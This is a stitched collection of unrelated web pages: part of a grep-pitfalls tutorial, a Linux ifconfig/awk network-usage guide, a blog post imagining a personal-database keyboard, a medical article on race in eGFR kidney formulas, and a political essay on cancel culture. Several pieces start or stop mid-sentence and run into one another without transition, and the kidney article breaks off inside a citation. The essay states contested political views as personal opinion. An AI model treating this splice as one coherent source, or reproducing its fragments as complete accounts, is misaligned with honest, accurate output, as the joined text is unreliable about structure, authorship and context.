<p><code><pre><span>grep</span> <span>'</span><span>`date`</span><span>'</span> sometext.txt
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;which will match correctly as expected:</p>

<p><code><pre>Make sure you write out the `date`.
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This isn't the only issue that you can encounter where your shell could unexpectedly change the meaning of the search string that you pass into grep. &nbsp;You can also encounter an issue with <a href="https://blog.robertelder.org/find-command-wildcard-globbing/">unexpected 'globbing'</a> when you attempt to use a regular expression containing the '*' character without using quotes. &nbsp;For example, consider this simple echo statement that just prints out 'asdf':</p>

<p><code><pre><span>echo</span><span> </span><span>"</span><span>asdf</span><span>"</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If you filter this echo statement through a grep search for the character 'a' like this:</p>

<p><code><pre><span>echo</span><span> </span><span>"</span><span>asdf</span><span>"</span><span> </span>| <span>grep</span> a
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the search will pass the line 'asdf' through as expected. &nbsp;And similarly, if you do a regex search with grep for an 'a' followed by any number of other characters like this:</p>

<p><code><pre><span>echo</span><span> </span><span>"</span><span>asdf</span><span>"</span><span> </span>| <span>grep</span> a.*
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this will also let the 'asdf' through. &nbsp;However, if you create a new file in the current directory called 'a.txt':</p>

<p><code><pre><span>touch</span> a.txt
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the following search won't work anymore! &nbsp;It doesn't find anything:</p>

<p><code><pre><span>echo</span><span> </span><span>"</span><span>asdf</span><span>"</span><span> </span>| <span>grep</span> a.*
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;What!? &nbsp;How can creating a new file change how our grep commands run in the shell??? &nbsp;This problem is explained in detail in <a href="https://blog.robertelder.org/find-command-wildcard-globbing/">this article on shell globbing</a>.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This mistake isn't specific to grep since it's really about regular expressions in general, but it's common enough to include in this article. &nbsp;Consider a case where you're trying to use grep to extract all instances of numbers that include a decimal point. &nbsp;In your search, you're looking for one or more digits, followed by a period, followed by one or more digits. &nbsp;You might try writing a grep command like this:</p>

<p><code><pre><span>echo</span><span> </span><span>"</span><span>234.328</span><span>"</span><span> </span>| <span>grep</span> <span>-Eo</span> <span>"</span><span>[0-9]+.[0-9]+</span><span>"</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;which looks like it works just fine because it does match all of the things you do want. &nbsp;The problem is that is also matches things that you <em>don't</em> want:</p>

<p><code><pre><span>echo</span><span> </span><span>"</span><span>234A328</span><span>"</span><span> </span>| <span>grep</span> <span>-Eo</span> <span>"</span><span>[0-9]+.[0-9]+</span><span>"</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In the above case, our regular expression will match the pattern '234A328' which isn't a decimal point number. &nbsp;This case becomes obvious when you point it out, since the '.' character usually represents "any character except for newline" in most regular expressions engines. &nbsp;In order to match a 'literal' period character in a regular expression, you need to escape it:</p>

<p><code><pre>
<span>echo</span><span> </span><span>"</span><span>234A328</span><span>"</span><span> </span>| <span>grep</span> <span>-Eo</span> <span>"</span><span>[0-9]+</span><span>\.</span><span>[0-9]+</span><span>"</span>

<span>echo</span><span> </span><span>"</span><span>234.328</span><span>"</span><span> </span>| <span>grep</span> <span>-Eo</span> <span>"</span><span>[0-9]+</span><span>\.</span><span>[0-9]+</span><span>"</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The lesson is to be careful when using searches that include a '.' character, since it may not always literally mean a period character.</p>




<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Here is some text that we'll place inside a file called 'animals.txt'. &nbsp;Take note that the two 'columns' in this file are separated with tab (\t) characters:</p>

<p><code><pre>Person	Favourite Animal\Pet
Robert	Cat
Alexander	Dog
Sam	Monkey
Michael	Snake
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Let's say that we wanted to write a grep statement to extract the first column from this file. &nbsp;We could do this quickly and crudely by writing a regular expression that will extract anything up and including the tab character. &nbsp;Here's an attempt to do this with the following grep command:</p>

<p><code><pre><span>grep</span> <span>-o</span> <span>"</span><span>.*</span><span>\t</span><span>"</span> animals.txt
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But if you run this, you'll get results that are completely wrong:</p>

<p><code><pre>Person  Favourite Animal\Pet
Robert  Cat
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The reason is, again, because of grep's default regular expression mode: BRE or 'Basic Regular Expressions'. &nbsp;However, if we try using the -E flag for 'Extended Regular Expressions', this doesn't fix the problem:</p>

<p><code><pre><span>grep</span> <span>-Eo</span> <span>"</span><span>.*</span><span>\t</span><span>"</span> animals.txt
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;still gives:</p>

<p><code><pre>Person  Favourite Animal\Pet
Robert  Cat
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In fact, if you check the <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap09.html">official standard for BRE and ERE</a>, you'll see that it has no support for matching just a 'tab' character! &nbsp;In POSIX BRE or ERE, there are just a handful of characters that you can escape with a backslash, and they don't include tab.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Confusingly, GNU grep <em>does</em> support things like '\s' in ERE even though it's not officially supported by the POSIX standard.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The solution in our case is to use the -P flag for 'Perl-Compatible Regular Expressions':</p>

<p><code><pre><span>grep</span> <span>-Po</span> <span>"</span><span>.*</span><span>\t</span><span>"</span> animals.txt
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;which gives us the expected result:</p>

<p><code><pre>Person
Robert
Alexander
Sam
Michael
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Unfortunately, the '-P' flag is not supported by all version of grep, so this solution isn't always available.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This issue is one that you won't encounter every day, but when you do it can be <em>extremely</em> confusing to figure out what's going on. &nbsp;If you ever happen to work with files that are encoded in UTF-16, you'll have to be mindful of the fact that grep isn't aware of character encodings, so whatever you grep for will likely only be found if it's in a character encoding that matches the current encoding of the terminal where you type the grep command.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;For example, imagine that you have two files: the first file encoded in UTF-8 contains this text:</p>

<p><code><pre>Hello World 123!
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and the second file encoded in UTF-16 contains this text:</p>

<p><code><pre>Hello World 456!
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;On my machine, if I do a grep search over both of these files using this grep command:</p>

<p><code><pre><span>grep</span> World *
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this will only match the statement in the first file!</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This fact isn't too surprising when you know what's going on, but the difficult part is noticing that you've got a file that's encoded in a different format in the first place. &nbsp;If you take regular ASCII characters and re-encode them as UTF-16, the file you get will look like regular ASCII encoded text with nulls placed between the characters. &nbsp;Therefore, if you print the file  onto the terminal, the nulls will be ignored and what you see printed will look indistinguishable from regular ASCII text (except for the byte order marker). &nbsp;Programs like vim will automatically recognize the encoding and display the file as normal text, so you likely won't notice the encoding.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;One way to identify the encoding of files is to use …</p></div></div></div>

  <li>Only works per session, i.e stats are gathered once you power up your PC (or login) and are lost when you shutdown.</li>
  <li>Good to have if you have limited data availability &amp; want to monitor your data usage.</li>
</ul>

<p>Let’s just review on what utilities we used here.</p>

<h2 id="ip"><code>ip</code></h2>

<p>Our first step is to find your default networking device (i.e the default networking interface) and its name.</p>

<div><div><pre><code>default via 192.168.42.129 dev enp0s20u4u1 proto dhcp metric 100 
169.254.0.0/16 dev enp0s20u4u1 scope <span>link </span>metric 1000 
192.168.42.0/24 dev enp0s20u4u1 proto kernel scope <span>link </span>src 192.168.42.149 metric 100
</code></pre></div></div>

<p>The first line of output lists our default network interface (the string followed by your PC name, mine is <code>dev</code>). The interface name will be different in your case.</p>

<h2 id="ifconfig"><code>ifconfig</code></h2>

<p>This is a good old tool used by network professionals to configure a network interface. <code>ifconfig $net_device</code> will display the status of our default net device.</p>

<div><div><pre><code><span>$ </span>ifconfig enp0s20u4u1
enp0s20u4u1: <span>flags</span><span>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.42.149  netmask 255.255.255.0  broadcast 192.168.42.255
        inet6 fe80::d464:9bdb:2b16:b27  prefixlen 64  scopeid 0x20&lt;<span>link</span><span>&gt;</span>
        inet6 2405:204:322e:53d:18ef:6496:fbb7:9309  prefixlen 64  scopeid 0x0&lt;global&gt;
        inet6 2405:204:322e:53d:93c3:cff8:8680:78bb  prefixlen 64  scopeid 0x0&lt;global&gt;
        ether 96:a3:91:8e:68:de  txqueuelen 1000  <span>(</span>Ethernet<span>)</span>
  <span>--</span><span>&gt;</span>   RX packets 19334  bytes 14292555 <span>(</span>14.2 MB<span>)</span>
        RX errors 0  dropped 0  overruns 0  frame 0

        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre></div></div>

<p>You see the <code>RX</code> and <code>TX</code> packets? Yup that’s our stats. Now we will use <code>awk</code> to extract those packet infos.</p>

<h2 id="awk"><code>awk</code></h2>

<p>AWK is a pattern scanning language, generally used for data manipulation needs.</p>

<p>Now, this is not a tutorial about awk but let’s just understand our use-case here. A simple awk statement might look like this.</p>

<div><div><pre><code><span>awk</span> <span>'/pattern/ { action }'</span>
</code></pre></div></div>

<p>So in our case, we want to look for <em>pattern</em> which matches <code>TX packets</code>.</p>

<div><div><pre><code><span>$ </span>ifconfig enp0s20u4u1 |  <span>awk</span> <span>'/TX packets/'</span>
        TX packets 18554  bytes 3411366 <span>(</span>3.4 MB<span>)</span>
</code></pre></div></div>

<p>Meh, this doesn’t look good. We want that human-readable format <code>3.4MB</code>. One thing which excites me is that we can access/read each individual field (or word or record) in that line. Each word can then be printed using <code>print $&lt;field-no&gt;</code> (an <a href="http://kirste.userpage.fu-berlin.de/chemnet/use/info/gawk/gawk_9.html#SEC87"><em>action</em></a>)</p>

<picture>
	<img alt="awk fields when using ifconfig command in linux" src="https://drive.google.com/uc?export=view&amp;id=1Zx4J4VdcufOlCGEjClrG-vdFbmdYEBhj">
	<figcaption>I know the last two rows are f**ked up. Maybe its a bug ?</figcaption>
</picture>

<p>Now we just print both the <code>$6</code> and <code>$7</code> fields.</p>

<div><div><pre><code><span>$ </span>ifconfig enp0s20u4u1 |  <span>awk</span> <span>'/TX packets/ { print $6$7 }'</span>
<span>(</span>5.7MB<span>)</span>
</code></pre></div></div>

<p>And of course, you can <code>watch</code> this script to get real-time feedback as well.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>What if your keyboard had access to your memories? What if it could complete
your thoughts, not based on what you'd previously typed or learning <a href="https://www.blog.google/products/gmail/subject-write-emails-faster-smart-compose-gmail/">generic
responses</a>
or <a href="http://www.autocorrectfail.org/">dumb rules</a>, but based on a personal
database of places, books, web pages, and notes of all kinds?</p>
<figure><a href="https://www.dampfkraft.com/by-id/7ee4a182/fast-keyboard.jpg"><img src="https://www.dampfkraft.com/by-id/7ee4a182/img/fast-keyboard.jpg.l.jpg"></a><figcaption>A keyboard should help you go places.
</figcaption></figure>
<p>To give an idea of what this would look like, when you type in Japanese, what
you type on the keyboard isn't exactly what shows up on the screen. Instead you
can type a romanized version of the text you want a few words at a time. After
each span you lock it in, and if you need conversion you choose one of a few
alternatives from a drop-down list. In some input systems, short definitions
may be shown next to the current selection.</p>
<div><video preload="auto" autoplay="autoplay" loop="loop" controls=""> <source src="https://i.imgur.com/4GU9LlG.webm" type="video/webm; codecs=&quot;vp8, vorbis&quot;"> </video><p>An example of me using Google's Japanese IME.</p></div>
<p>Autocomplete in Japanese is based on a dictionary supplied with your operating
system, plus a user dictionary. If you frequently have to type something not in
the dictionary you can register it in a personal dictionary to have it come out
just like any other word. You can also get creative and register things that
aren't normal words, like converting "home" to "123 Mt. Pleasant Drive".</p>
<p>This <em>mediated input</em> opened up potential for cleverness in software keyboards,
acronymically known as <a href="https://en.wikipedia.org/wiki/Input_method">Input Method Engines (IMEs)</a>. Introducing emoji
was just a matter of adding them to a font and the dictionary - you didn't have
to tell people how to use them, as they'd just be another completion option
when you typed "beer" 🍻 or "love" 😍 or what have you.</p>
<p>Now we all have smartphones, and we all have mediated input, and emoji are
everywhere. Hooray. 🎊</p>
<p>But what if mediated input were smarter? What if it were more personal?</p>
<p>What if you could type "Here's that <a href="https://en.wikipedia.org/wiki/Jiaozi#Gy%C5%8Dza">gyoza</a> place I went to last week" and
autocomplete a map link?</p>
<figure><a href="https://www.dampfkraft.com/by-id/7ee4a182/magickeyboard.png"><img src="https://www.dampfkraft.com/by-id/7ee4a182/img/magickeyboard.png.l.png"></a><figcaption>A mockup of a philosopher's keyboard search interface.
</figcaption></figure>
<p>"Here's that book I mentioned at lunch." "This is that game with indirect
controls." "This is the page for that meetup you should go to." "This is where
you can get tickets for that museum show."</p>
<p>Of course you can already share this information thanks to the universal power
of links, but what if it didn't need a context switch? What if taking notes on
things made it easier for you to share them with people? (This is, of course,
part of the dream of the <a href="https://en.wikipedia.org/wiki/Memex">Memex</a>.)</p>
<p>Six years ago when I started work on <a href="https://www.dampfkraft.com/projects/introducing-deltos.html">Deltos</a> for personal note
taking, one of my goals was to use the notes in Deltos as fodder for a
philosopher's keyboard, but that ended up falling by the wayside. It turns out
working with IMEs is difficult - every operating system has a completely
different way of handling them, and they often aren't well documented.</p>
<p>In particular, IMEs often work on the principle that for any given input, the
potential outputs are clearly defined. In a dictionary file these are just
short bits of text. But if you can search through all your notes, then inputs
and outputs aren't well defined, and just updating the dictionary isn't enough -
you need search functionality.</p>
<p>One idea is to avoid using the IME interface directly. A small application,
just a search box where a selection is copied to the clipboard, would be enough
to realize the main goal of the philosopher's keyboard, while still minimizing
context switching. It would also make it easier to create a cross-platform app.
Maybe that's good enough.</p>
<p>The other problem is that most people don't have an explicit personal database,
just a bunch of personal data locked up in silos. Fixing that is another and
honestly bigger step, but it can be handled one person at a time.</p>
<p>I don't think this keyboard exists yet. But I hope it will soon. Ψ</p>

Individuals with kidney failure have low GFRs. If the GFR is low enough, the person will need artificial blood filtering – also known as dialysis. </span></p><p id="viewer-2gkum"><span>Measuring actual GFR is time consuming and cumbersome. The gold standard involves an injection of inulin, a polysaccharide not normally found in humans’ bloodstreams, with multiple blood and urine tests over several hours to quantify the rate of filtration of this substance. But most people will never have an inulin GFR test done. Instead, their kidney function will be estimated using creatinine, a much simpler test. This is what is included on your routine bloodwork panel and it is how the eGFR is calculated. Creatinine is a waste product from muscle that is excreted into the urine. We all make creatinine, and if our kidneys are functioning, they are filtering creatinine at a constant rate. Blood levels of creatinine turn out to be a relatively good measure of how well our kidneys are filtering – in general, if the creatinine is rising, kidney function is declining. </span></p><div id="viewer-7vs49"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.devaboone.com/post/african-american-kidneys" data-pin-media="https://static.wixstatic.com/media/3e0600_cc3dbcbab70a4a9399927140a91a1403~mv2.jpg/v1/fit/w_900%2Ch_634%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/3e0600_cc3dbcbab70a4a9399927140a91a1403~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-38em3"><span><em>Creatinine: a muscle breakdown product used to estimate kidney function </em></span></p><p id="viewer-2to2l"><span><em>Image by </em><a href="https://www.bigstockphoto.com/search/?contributor=Liliya4" target="_blank" rel="noopener"><em><u>Liliya4</u></em></a><em> at </em><a href="http://bigstockphoto.com/" target="_blank" rel="noopener"><em><u>bigstockphoto.com</u></em></a><em> </em></span></p><p id="viewer-6jgmm"><span>Creatinine levels are not a perfect approximation of kidney function, though, since individuals differ in the amount of creatinine they produce. The more creatinine someone makes, the higher her creatinine level, even if her kidneys are working fine. Creatinine comes from muscle, so more muscular individuals release more creatinine and have overall higher creatinine levels than scrawny individuals. Men, as a group, tend to have a higher muscle mass than women, so they also tend to have higher creatinine levels. Elderly individuals, who have lost muscle mass with aging, tend to have lower creatinine levels. If we want to estimate kidney function based on creatinine, we need to correct for muscle mass. Accurately measuring muscle mass is another cumbersome procedure, so instead, we use generalizations and correct for them: the formula for calculating eGFR thus uses gender and age as a gross correction for muscle mass. We assume that younger people and males will have higher creatinine levels at baseline.</span></p><div id="viewer-6mfk8"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.devaboone.com/post/african-american-kidneys" data-pin-media="https://static.wixstatic.com/media/3e0600_a804d211ac854f1bac8b3e7967fa607f~mv2.jpg/v1/fit/w_900%2Ch_693%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/3e0600_a804d211ac854f1bac8b3e7967fa607f~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-8im22"><span><em>The guy on the right will have higher creatinine levels - and a lower estimated GFR</em></span></p><p id="viewer-2t2r2"><span><em>Photo by </em><a href="https://www.bigstockphoto.com/search/?contributor=Body+Stock" target="_blank" rel="noopener"><em><u>Body Stock</u></em></a><em> at </em><a href="http://bigstockphoto.com/" target="_blank" rel="noopener"><em><u>bigstockphoto.com</u></em></a><em> </em></span></p><p id="viewer-m2bo"><span>But it turns out that even when accounting for gender and age, our formula for calculating eGFR from creatinine levels is not perfect. One reason is that <strong>different geographic and ethnic groups seem to have different baseline levels of creatinine</strong>. The first estimated GFR was developed by Cockcroft and Gault in the 1970s – they showed that blood levels of creatinine could be used to estimate creatinine clearance, which correlated with GFR.[1] Unfortunately, the study included only white people (and mostly men), so it was not clear whether their model would extend to everyone. When later tested in people who self-identified as Black, creatinine levels were correlated with GFR, but at different levels than in those who self-identified as white individuals. That is, Blacks had higher creatinine levels, on average, for any given GFR. For many years this was assumed to be due to increased muscle mass in Blacks, something that has been documented in many studies, but this explanation may be inadequate.[2] Whatever the reason, it does appear that when considering self-described Blacks as a whole, Blacks do have higher creatinine levels than non-Blacks with the same renal function.</span></p><p id="viewer-c0oqp"><span>As a result of this, researchers decided to start factoring in race when calculating the estimated GFR. In 1999 the Modification of Diet in Renal Disease study proposed a new estimated GFR formula, now called the MDRD equation.[3] This equation included age and gender, like the Cockcroft-Gault formula, but also included Black ethnicity, and seemed to produce a more accurate picture of kidney function (at least in their study population). Another big update came in 2009, when the Chronic Kidney Disease Epidemiology Collaboration (CKD-EPI) released their own formula, which used the same variables as the MDRD model, but with some modifications in order to make it more accurate for those with normal kidney function (MDRD had only looked at those with kidney disease).[4] The CKD-EPI and MDRD equations are now the most common methods of estimating GFR from creatinine level – these are the ones used to give you the eGFR on your lab slip.</span></p><p id="viewer-c12ip"><span>The formulas require age and gender, which are usually included in the lab requisition, so the lab can plug those into the formula for calculating eGFR. Since ethnicity and race are usually not given to the lab, it has to give two eGFRs, one for African Americans and one for non-African Americans (what was called Black ethnicity in the studies has become African American on most lab results, ignoring the different meanings of these terms). </span></p><p id="viewer-9bd8m"><span>In the last few years physicians have started questioning the use of race in GFR estimation. One reason is that race and ethnicity are not limited to Black and non-Black. Multiple geographic and ethnic groups appear to have different normal ranges for creatinine, leading to inaccurate eGFRs unless another correction for race is made. And not all Blacks need the “Black equation”: <strong>Black African adults living in Africa seem to have a more accurate eGFR when using the “non-Black” equation. </strong>[5]</span></p><div id="viewer-7fcf0"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.devaboone.com/post/african-american-kidneys" data-pin-media="https://static.wixstatic.com/media/3e0600_9400ad22ac39476bbf60ebe873907cc5~mv2.jpg/v1/fit/w_900%2Ch_500%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/3e0600_9400ad22ac39476bbf60ebe873907cc5~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-2ga2k"><span><em>African American and non-African American kidneys look the same - and they all look surprisingly like kidney beans. </em></span></p><p id="viewer-19vrj"><span><em>Photo by </em><a href="https://www.bigstockphoto.com/search/?contributor=Engdao" target="_blank" rel="noopener"><em>Engdao</em></a><em> at </em><a href="http://bigstockphoto.com/" target="_blank" rel="noopener"><em>bigstockphoto.com</em></a><em>. </em></span></p><p id="viewer-47l2j"><span>Another reason for questioning the use of race in the equation centers on treating what is essentially a social construct (race) as an objective physiologic truth. There is no gene for “Black.” And whether someone defines herself as Black (or African American) is heavily influenced by culture. Many of us have mixed genetic backgrounds. Does someone with a Black mother and white father count as Black, white, both, or something else? And which eGFR equation should he use? There are numerous ethnicities that do not fit neatly into Black vs. non-Black. And there are numerous ethnicities within the broad category of Black – why include such imprecise categorization into a medical equation?</span></p><p id="viewer-b6sen"><span>Finally, <strong>using a race-corrected formula may lead to worse care for African Americans</strong>. Many clinical decisions rest on the eGFR. We diagnose chronic kidney disease, determine medication dosages, and decide when to refer to a specialist all based on eGFR. When using the race correction for eGFR, an African American will be assigned a higher (better) GFR than a white person with the same creatinine. In cases that are near the cutoffs for referral, it may be that the white person is referred to a specialist when the African American is not, even though they have the same creatinine levels. eGFR also determines who can be referred for a kidney transplant. Again, if the eGFR levels are close to the cutoff for referral, then the white person will be referred for a transplant before the African American. All of this is fine if the calculated eGFR is an actual representation of kidney function. But given that we see variations in creatinine ranges even within different “African American” populations, can we legitimately assume that every African American patient is best served by the African American equation? </span></p><p id="viewer-1472n"><span><strong>If the answer is not a solid "yes", then we probably should not use race in our estimation of GFR. </strong></span></p><p id="viewer-7bkrb"><span>Earlier this year, the University of Washington Department of Medicine decided to <a href="https://medicine.uw.edu/news/uw-medicine-exclude-race-calculation-egfr-measure-kidney-function" target="_blank" rel="noopener"><u>stop using race in eGFR calculations</u></a>, after medical students began questioning the practice. Their solution was just to remove race from the formula, keeping age and gender, and continue to use creatinine levels. Unfortunately, the discrepancies in creatinine levels between ethnicities and geographic areas persists, compromising the accuracy of any formula using creatinine. </span></p><p id="viewer-dal68"><span>A better solution would use something other than creatinine. The protein cystatin C is one candidate that is already used in some circumstances. Unlike creatinine, it is not as influenced by muscle mass or ethnicity, but currently it is not widely available and is more expensive. Studies on its accuracy have been mixed, and we don’t yet have enough evidence that it works better than creatinine overall. [6] For now, creatinine may be the best we have, but with increased awareness of race issues in health, this will likely change. African Americans and non-African Americans both need a better method of tracking kidney function. </span></p><p id="viewer-7h1il"><span><span>[1]</span> <a href="https://pubmed.ncbi.nlm.nih.gov/1244564/" target="_blank" rel="noopener"><u>Cockcroft DW, Gault MH.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3389">

<div>
<p>Those that know me, know that I am both bold and resolute. I stand by my thoughts / comments, yet I attempt to keep an open mind, analyze a situation, self-reflect on any biases, and integrate feedback. I even go so far as to analyze my confidence level, see <a href="https://predictionbook.com/" target="_blank" rel="noopener noreferrer">predictionbook.com</a>.</p>
<p>With that in mind. I want to share how utterly angry and helpless I feel —</p>
<p>I can’t share my true thoughts, hell my analysis, of the current political situation in the U.S. Although I have written on it countless times, I end up deleting the posts.</p>
<p>Why?</p>
<p>It’s not safe to share thoughts.</p>
<h2>State of Affairs</h2>
<p>Today, sharing one’s opinion can cost you your livelihood, your ability to communicate, and more.</p>
<p>Historically, that was always true, perhaps more-so. We’re now returning to the status quo — repression.</p>
<p>Today’s flavor of repression is one where offending someone randomly across the globe, can cost you your job. That person may not have a standing in your community and may not have a relationship with your employer. However, they can amplify their voice, tweet your employer, and your employer (scared out of its mind by the current situation) will terminate you. That is the state of affairs today. It doesn’t matter if you’re correct or innocent. It doesn’t even matter if 99.9% of people aren’t offended by what you said — we are now in a world of “<a href="https://en.wikipedia.org/wiki/Online_shaming#Cancellation" target="_blank" rel="noopener noreferrer">cancel culture</a>“.</p>
<h2>Finding Middle Ground</h2>
<p>In the United States in 2020, we have two paths. One path leads to an ever more left-leaning populous “uprising”; the other path leads to an ever more right-leaning populous “uprising”. I don’t see an alternative, outside of some quite-frankly comical alternatives (e.g. President Mitt Romney, with VP Bernie Sanders).</p>
<p>One way or another, I lose. No one is speaking up for my beliefs or representing me.</p>
<p>I sense I’m not alone. Everyone I speak to left or right, hates the current state of affairs. Most of us even agree on <em>why</em> we distrust the system. Unfortunately, we can’t elect someone to fix the system. Neither Trump, nor Biden, nor Bernie, nor anyone on the ballot accurately represents or even inspires us.</p>
<p>By and large, I believe this is due to the “absolute” nature of our current social strife. Take the question:</p>
<blockquote><p>Why can’t I be anti-vaccine and pro-choice?</p></blockquote>
<p>You would suspect everyone would agree that we “own” our bodies. If that were true, then you would effectively have to be pro-choice AND support people’s right to choose what to put in their bodies; body ownership is the middle ground. I wish we could coalesce around the middle ground, then compromise on edge cases, enabling progress.</p>
<p>Take another example:</p>
<blockquote><p>Why don’t we do firearms training in schools?</p></blockquote>
<p>It’s an honest question — we’ve had the 2nd amendment for hundreds of years. Similar to driving a car, we should train our youth to handle firearms. I suspect we all know the reason this is not occurring — because a significant portion of the United States is fearful of firearms.</p>
<p>From the evidence, the fear is unjustified. We have evidence that with a good training program and robust mental evaluation process, firearms by-and-large are safe for society. <a href="https://en.wikipedia.org/wiki/Firearms_regulation_in_Switzerland" target="_blank" rel="noopener noreferrer">See Switzerland</a>:</p>
<blockquote><p>Swiss males grow up expecting to undergo basic military training, usually at age 20 in the recruit school..</p>
<p>…Prior to 2007, members of the Swiss Militia were supplied with 50 rounds of ammunition for their military weapon in a sealed ammo box that was regularly audited by the government…</p>
<p>…Every person with a Swiss citizenship, aged 10 years or older, can take part at any federal ranges and will be able to shoot for free with the ordinance rifle…</p>
<p>…In 2016, there were 187 attempted and 45 completed homicides, for a homicide rate of 0.50 per 100,000 population, giving Switzerland one of the lowest homicide rates in the world…</p></blockquote>
<p>Further, firearms are already widely available (<a href="https://en.wikipedia.org/wiki/Estimated_number_of_civilian_guns_per_capita_by_country" target="_blank" rel="noopener noreferrer">300+ million guns in the U.S.</a>) &amp; availability enshrined in law.</p>
<p>Sorrowfully, evidence doesn’t matter here; fear guides many. Yoda has some insights here:</p>
<blockquote><p><span data-parade-type="promoarea" data-parade-location-types="promoarea" data-parade-location-ids="article" data-parade-views="false" data-parade-touches="false" data-parade-clicks="false" data-parade-mouseovers="false">Fear is the path to the dark side. Fear leads to anger. Anger leads to hate. Hate leads to suffering.</span></p>
<p>— George Lucas (Yoda)</p></blockquote>
<h2>The False Dichotomy</h2>
<p>I don’t agree with the left or the right on many things in United States politics. In fact, I find most of the arguments a false dichotomy, designed to garner votes. To share one’s full thoughts would cause either or both sides to lash out, even though evidence may support the claims / musings.</p>
<p>Regretfully, this leaves me and many others out of the public discourse. While most of us have heard,</p>
<blockquote><p>The only thing necessary for the triumph of evil is for good men to do nothing.</p>
<p>— Edmund Burke (attributed)</p></blockquote>
<p>It’s not quite that simple and I prefer another sentiment:</p>
<blockquote><p>A man dies when he refuses to stand up for that which is right. A man dies when he refuses to stand up for justice. A man dies when he refuses to take a stand for that which is true.</p>
<p>— Martin Luther King Jr.</p></blockquote>

<iframe data-lazy-type="iframe" data-src="https://www.youtube.com/embed/0On19DRA2fU?start=88" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"><span style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" data-mce-type="bookmark" class="lazy lazy-hidden mce_SELRES_start">﻿</span></iframe></center><p>Truthfully, we’re all being held hostage. I am very confident few people fully agree with either side in this political theater. We have extremists on either side shouting and being amplified by social media. In truth, the vast majority of us don’t agree [fully] with either extreme. Most of us, want to “live and let live” — that’s the American way. We’re a country founded on our hatred for taxes and the desire to live free from persecution. Please, please.. Don’t let that change.</p>
<p>It’s easy to decide “what’s right” when you look at it through that lens — am I persecuting others or increasing taxes (arguably a form of persecution)? If either are true, likely we should reconsider our stance.</p>
<h2>The Chaos</h2>
<p>Today, we are edging towards chaos. We all feel it. Riots, job loss, deadly diseases, [trade] wars, homelessness… We need leadership that can unite us.</p>
<p>Unfortunately, many of our would-be leaders have opted out or have been pushed out of this system. They’ve become engineers, scientists, bloggers — too scared to share their opinions (<a href="https://en.wikipedia.org/wiki/Slate_Star_Codex" target="_blank" rel="noopener noreferrer">even shutting down</a>). To hold a nuanced opinion different from the “socially accepted” by one group or another will get you “canceled”. In this case, “canceled” can mean anything from losing your job, to losing financial platforms/instruments (i.e. PayPal, VISA, YouTube revenue, etc.), to receiving threats on your life.</p>
<p>We have an ongoing pandemic, with millions in the United States likely about to perish, the economy collapsing, and we still cannot escape the politics.</p>
<p>I’m not hopeful.</p>
<p>I have so many musings, stories, and analyses I’d like to share, but neither facts nor my opinions matter.</p>
<p>Let’s be honest —</p>
<ul>
<li>I’m a white, cisgender, straight, male</li>
<li>I work as a technical manager in a research group, at a bank</li>
<li>I’m socially liberal in many ways and conservative in others</li>
<li>I grew up lower-middle class; now, I’m upper-middle class</li>
<li>I don’t attribute myself to any political party</li>
</ul>
<p>A large number of people dismiss or overlook me because of my background. Those who don’t outright dismiss me are also not likely to support my interest(s).</p>
<h2>Meritocracy or Bust</h2>
